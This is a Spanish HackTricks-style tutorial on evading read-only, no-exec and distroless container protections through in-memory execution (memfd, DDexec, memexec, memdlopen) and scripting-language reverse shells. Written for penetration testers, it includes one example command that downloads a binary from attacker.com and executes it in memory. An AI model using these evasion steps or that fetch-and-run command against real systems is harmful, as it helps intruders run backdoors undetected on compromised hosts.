# Saltar las protecciones del sistema de archivos: solo lectura / sin ejecución / Distroless

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo imposible - ¡**estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas más a fondo:

* [**DEF CON 31 - Explorando la Manipulación de Memoria en Linux para Sigilo y Evasión**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusiones sigilosas con DDexec-ng e in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Escenario de solo lectura / sin ejecución

Es cada vez más común encontrar máquinas Linux montadas con **protección de sistema de archivos de solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con sistema de archivos ro es tan fácil como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que es falso que no podamos escribir nada en el disco. Sin embargo, esta carpeta estará **montada con protección sin ejecución**, por lo que si descargas un binario aquí, **no podrás ejecutarlo**.

{% hint style="warning" %}
Desde la perspectiva de un equipo rojo, esto hace que sea **complicado descargar y ejecutar** binarios que no estén en el sistema (como puertas traseras o enumeradores como `kubectl`).
{% endhint %}

## Salto más fácil: Scripts

Ten en cuenta que mencioné binarios, puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **script de shell** si `sh` está presente o un **script de python** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu puerta trasera binaria u otras herramientas binarias que puedas necesitar ejecutar.

## Saltos de Memoria

Si deseas ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde la memoria**, ya que las **protecciones no se aplican allí**.

### Salto de llamada al sistema FD + exec

Si tienes motores de script potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, podrías descargar el binario para ejecutarlo desde la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no estará protegido por esas protecciones, y luego llamar a una **llamada al sistema `exec`** indicando el **fd como el archivo a ejecutar**.

Para esto, puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64** con las instrucciones para **decodificarlo y descomprimirlo** en un **fd** creado llamando a la llamada al sistema `create_memfd` y una llamada al sistema **exec** para ejecutarlo.

{% hint style="warning" %}
Esto no funciona en otros lenguajes de script como PHP o Node porque no tienen una **forma predeterminada de llamar a llamadas de sistema crudas** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **fd de memoria** para almacenar el binario.

Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo debido a que se aplicará la **protección sin ejecución**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código de ensamblaje** que está siendo ejecutado por el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde la **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obtener más información sobre esta técnica, consulta el Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **shellcode demonizado de DDexec**, por lo que cada vez que desees **ejecutar un binario diferente** no necesitas volver a lanzar DDexec, simplemente puedes ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un shell inverso de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar a DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **forma más fácil de cargar binarios** en memoria para luego ejecutarlos. Incluso podría permitir cargar binarios con dependencias.

## Bypass de Distroless

### ¿Qué es Distroless?

Los contenedores Distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores Distroless es **reducir la superficie de ataque de los contenedores al eliminar componentes innecesarios** y minimizar la cantidad de vulnerabilidades que pueden ser explotadas.

### Shell Inverso

En un contenedor Distroless es posible que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que sueles ejecutar en un sistema.

{% hint style="warning" %}
Por lo tanto, **no** podrás obtener un **shell inverso** o **enumerar** el sistema como sueles hacerlo.
{% endhint %}

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, una aplicación web flask, entonces Python está instalado, y por lo tanto puedes obtener un **shell inverso de Python**. Si está ejecutando node, puedes obtener un shell inverso de Node, y lo mismo con la mayoría de los **lenguajes de script**.

{% hint style="success" %}
Usando el lenguaje de script podrías **enumerar el sistema** utilizando las capacidades del lenguaje.
{% endhint %}

Si no hay protecciones de **`solo lectura/sin ejecución`** podrías abusar de tu shell inverso para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

{% hint style="success" %}
Sin embargo, en este tipo de contenedores estas protecciones generalmente existirán, pero podrías usar las **técnicas de ejecución de memoria anteriores para evadirlas**.
{% endhint %}

Puedes encontrar **ejemplos** de cómo **explotar algunas vulnerabilidades de RCE** para obtener **shells inversos de lenguajes de script** y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
